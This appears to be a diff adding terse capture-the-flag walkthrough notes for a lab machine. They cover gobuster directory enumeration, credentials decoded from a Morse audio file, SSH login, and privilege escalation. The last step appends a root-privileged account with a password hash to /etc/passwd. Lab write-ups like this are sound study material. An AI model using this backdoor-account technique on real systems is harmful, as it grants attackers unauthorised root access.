@@ -1,0 +1,17 @@
+192.168.0.105
+
+gobuster dir -u http://192.168.0.105 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 
+useful directory /bulma
+find_me.html
+
+Download Audio file and decode it 
+https://morsecode.world/international/decoder/audio-decoder-adaptive.html
+I have set frequency 750
+Got this message USER : TRUNKS PASSWORD : US3R<KN>S IN DOLLARS SYMBOL)
+
+Try to get ssh acces using trunks:u$3r
+
+check history file 
+echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
+su Tom
+provide password
